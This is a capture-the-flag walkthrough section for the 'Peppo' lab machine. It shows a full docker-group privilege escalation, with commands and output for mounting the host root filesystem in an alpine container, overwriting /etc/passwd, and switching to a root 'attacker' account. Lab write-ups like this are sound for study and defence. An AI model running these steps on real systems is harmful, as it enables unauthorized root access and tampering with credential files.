## Priv Esc

This covers an alternative Priv Esc without using either of the two available docker images. Our user is in docker group. First download an alpine image. You can do this [without installing docker](https://stackoverflow.com/questions/37905763/how-do-i-download-docker-images-without-using-the-pull-command) on Kali.

```text
root@kali:~/CTF/PGPractice/Peppo/PE# ./download-frozen-image-v2.sh alpine_dir alpine:latest
Downloading 'library/alpine:latest@latest' (1 layers)...
-=O=- #    #      #        #
################################################################################################################################################### 100.0%

Download of images into 'alpine_dir' complete.
Use something like the following to load the result into a Docker daemon:
  tar -cC 'alpine_dir' . | docker load
```

Then tar it

```text
root@kali:~/CTF/PGPractice/Peppo/PE# ls -lah alpine_dir/
total 24K
drwxr-xr-x 3 root root 4.0K Jun  1 01:32 .
drwxr-xr-x 3 root root 4.0K Jun  1 01:32 ..
-rw-r--r-- 1 root root 1.5K Jun  1 01:32 6dbb9cc54074106d46d4ccb330f2a40a682d49dda5f4844962b7dce9fe44aaec.json
drwxr-xr-x 2 root root 4.0K Jun  1 01:32 86f68eb8bb2057574a5385c9ce7528b70632e1c750fb36d5ac76c0a5460f5d95
-rw-r--r-- 1 root root  251 Jun  1 01:32 manifest.json
-rw-r--r-- 1 root root   32 Jun  1 01:32 repositories

root@kali:~/CTF/PGPractice/Peppo/PE# tar -C alpine_dir -cf alpine.tar .
root@kali:~/CTF/PGPractice/Peppo/PE# ls -lah
total 3.0M
drwxr-xr-x 3 root root 4.0K Jun  1 01:34 .
drwxr-xr-x 4 root root 4.0K Jun  1 01:23 ..
drwxr-xr-x 3 root root 4.0K Jun  1 01:32 alpine_dir
-rw-r--r-- 1 root root 2.7M Jun  1 01:34 alpine.tar
-rwxr-xr-x 1 root root  13K Jun  1 01:30 download-frozen-image-v2.sh
-rw-r--r-- 1 root root  96K Jun  1 01:24 linpeas.txt
-rw-r--r-- 1 root root  99K Jun  1 01:24 lse.txt
```

Copy over to the target

```text
eleanor@peppo:~/tmp$ docker load -i alpine.tar
b2d5eeeaba3a: Loading layer [==================================================>]  2.812MB/2.812MB
Loaded image: alpine:latest
eleanor@peppo:~/tmp$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              6dbb9cc54074        6 weeks ago         5.61MB
redmine             latest              0c8429c66e07        12 months ago       542MB
postgres            latest              adf2b126dda8        12 months ago       313MB
```

Then we can escalate with

```text
eleanor@peppo:~/tmp$ docker run -v /:/mnt -it alpine
/ # ls -lah /mnt
total 84K
drwxr-xr-x   22 root     root        4.0K May 25  2020 .
drwxr-xr-x    1 root     root        4.0K May 31 17:36 ..
drwxr-xr-x    2 root     root        4.0K Jun  1  2020 bin
drwxr-xr-x    3 root     root        4.0K Jun  1  2020 boot
drwxr-xr-x   16 root     root        2.9K Aug 12  2020 dev
drwxr-xr-x   84 root     root        4.0K Aug  6  2020 etc
drwxr-xr-x    3 root     root        4.0K May 25  2020 home
lrwxrwxrwx    1 root     root          30 May 25  2020 initrd.img -> boot/initrd.img-4.9.0-12-amd64
lrwxrwxrwx    1 root     root          30 May 25  2020 initrd.img.old -> boot/initrd.img-4.9.0-11-amd64
drwxr-xr-x   14 root     root        4.0K Jun  1  2020 lib
drwxr-xr-x    2 root     root        4.0K May 25  2020 lib64
drwx------    2 root     root       16.0K May 25  2020 lost+found
drwxr-xr-x    3 root     root        4.0K May 25  2020 media
drwxr-xr-x    2 root     root        4.0K May 25  2020 mnt
drwxr-xr-x    3 root     root        4.0K Jun  1  2020 opt
dr-xr-xr-x  101 root     root           0 Aug 12  2020 proc
drwx------    2 root     root        4.0K May 31 10:57 root
drwxr-xr-x   19 root     root         640 May 31 16:53 run
drwxr-xr-x    2 root     root        4.0K Jun  1  2020 sbin
drwxr-xr-x    2 root     root        4.0K May 25  2020 srv
dr-xr-xr-x   13 root     root           0 May 31 11:41 sys
drwxrwxrwt   10 root     root        4.0K May 31 17:36 tmp
drwxr-xr-x   11 root     root        4.0K Jun  1  2020 usr
drwxr-xr-x   11 root     root        4.0K May 25  2020 var
lrwxrwxrwx    1 root     root          27 May 25  2020 vmlinuz -> boot/vmlinuz-4.9.0-12-amd64
lrwxrwxrwx    1 root     root          27 May 25  2020 vmlinuz.old -> boot/vmlinuz-4.9.0-11-amd64

/ # cp /mnt/home/eleanor/tmp/passwd /mnt/etc/passwd
/ # exit
eleanor@peppo:~/tmp$ tail /etc/passwd
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false

eleanor@peppo:~/tmp$ su attacker
Password:
root@peppo:/home/eleanor/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

